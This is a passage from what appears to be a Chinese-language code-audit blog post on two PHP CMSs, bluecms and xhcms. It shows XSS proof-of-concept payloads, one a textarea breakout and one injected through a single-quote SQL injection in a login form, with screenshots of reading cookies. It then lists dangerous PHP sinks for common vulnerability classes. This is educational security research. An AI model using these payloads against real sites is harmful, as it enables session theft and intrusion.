<p>发现是POST传值，这里还有<code>addslashes</code>函数，但变量未被单引号包裹，我们不需要单引号，这就意味着这个是没有什么作用的，尝试xss</p>
<div class="highlight"><pre><span></span><span class="x">ad1=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;save=1</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756313.png"/></p>
<h4 data-content="1" id="746624aa9cc8d724c1b0b0408f41c99c">admin/login</h4>
<p>刚刚我们测试过它存在SQL注入漏洞，并且知道它是单引号闭合，既然我们可以后面写入报错语句，那岂不是也可以写入我们的xss语句，尝试一下</p>
<div class="highlight"><pre><span></span><span class="x">1'adn&lt;script&gt;alert(1)&lt;/script&gt;#</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756327.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756366.png"/><br/>
调用一下cookie<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756438.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756430.png"/></p>
<h4 data-content="1" id="ef9763219f0c84f5ff7b7113dfe31a98">install/index.php</h4>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756773.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756786.png"/></p>
<h1 data-content="1" id="2610656eff0a977f31379ac0aa899654">总结</h1>
<p>从这两个简单的CMS代码审计中学到了一点知识，简单的总结一下</p>
<h2 data-content="1" id="6cc8b7be3962ac9cd7be7eaa9ff4d331">不同CMS异同</h2>
<p>大部分没MVC框架的CMS，他们的结构是比较相似的，我们可以看一下这两个CMS的结构<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756850.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756867.png"/><br/>
可以发现两者的结构是比较相像的，当我们掌握文件夹的功能时，就能够使得我们的代码审计轻松许多，因此通过文件夹掌握其功能含义是我们首先需要做到的</p>
<p>区别的话就是有的程序员会把css单独作为文件夹(例如这里的xhcms)，有的会把js文件单独作为文件夹(这里的bluecms)，不过这些都是无关紧要的，大致知道文件夹是什么含义，存放的文件是什么就可以</p>
<h2 data-content="1" id="1b62fc0277e042beb00c1b5577737bcd">常见关注点</h2>
<p>SQL注入：</p>
<div class="highlight"><pre><span></span><span class="k">select</span> <span class="k">insert</span> <span class="k">update</span> <span class="n">mysql_query</span> <span class="n">mysqli等</span>
</pre></div>
<p>文件上传：</p>
<div class="highlight"><pre><span></span><span class="x">$FILES，type="file"，上传，move_upload_file( )等</span>
</pre></div>
<p>XSS跨站：</p>
<div class="highlight"><pre><span></span><span class="x">print，print_r，echo，sprintf，die，var_dump，var_export等</span>
</pre></div>
<p>文件包含：</p>
<div class="highlight"><pre><span></span><span class="x">include，include_once，require，require_once等</span>
</pre></div>
<p>代码执行：</p>
<div class="highlight"><pre><span></span><span class="x">eval，assert，preg，replace，call，user，func，call_user_func，array等</span>
</pre></div>
<p>命令执行：</p>
<div class="highlight"><pre><span></span><span class="x">system，exec，shell_exec，``，passthru，pcntl_exec，popen，proc_open等</span>
</pre></div>
<p>变量覆盖：</p>
<div class="highlight"><pre><span></span><span class="x">extract() parse_str() importrequestvariables() $$</span>
</pre></div>
<p>反序列化：</p>
<div class="highlight"><pre><span></span><span class="x">serialize() unserialize() _construct _destruct等</span>
</pre></div>
<h2 data-content="1" id="3b16b9e99a0aa5fbcf4802c80e6b1ace">个人感想</h2>
<p>我们挖掘出一个漏洞的时候，它可能不仅仅只是这一个漏洞，举个例子。<br/>
当我们关注一个地方的SQL注入的话，就是找<code>SELECT * from</code>此类语句，同时如果它存在SQL注入的话，那它可能不仅仅是SQL注入点，也可能是XSS点，因为后面语句可控的话，插上一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>也并非难事，但这些SQL语句也并不少，这就需要我们观察语句是否可控，同时看是否过滤了，是否过滤十分严格以致于不存在漏洞，总之多多进行测试，实践出真知。</p>
<h1 data-content="1" id="cb7532d65d67a8a3499667475499dfcd">参考文章</h1>
<p><a href="https://xz.aliyun.com/t/7992" target="_blank">https://xz.aliyun.com/t/7992</a><br/>
<a href="https://xz.aliyun.com/t/11310" target="_blank">https://xz.aliyun.com/t/11310</a><br/>
<a href="https://www.cnblogs.com/Cl0ud/p/12824593.html" target="_blank">https://www.cnblogs.com/Cl0ud/p/12824593.html</a><br/>
<a href="https://www.cnblogs.com/wkzb/p/12732078.html" target="_blank">https://www.cnblogs.com/wkzb/p/12732078.html</a><br/>
<a href="https://www.cnblogs.com/zjhzjhhh/p/14338775.html" target="_blank">https://www.cnblogs.com/zjhzjhhh/p/14338775.html</a><br/>
<a href="https://blog.csdn.net/weixin_44770698/article/details/125656478" target="_blank">https://blog.csdn.net/weixin_44770698/article/details/125656478</a></p>
</div>
</div>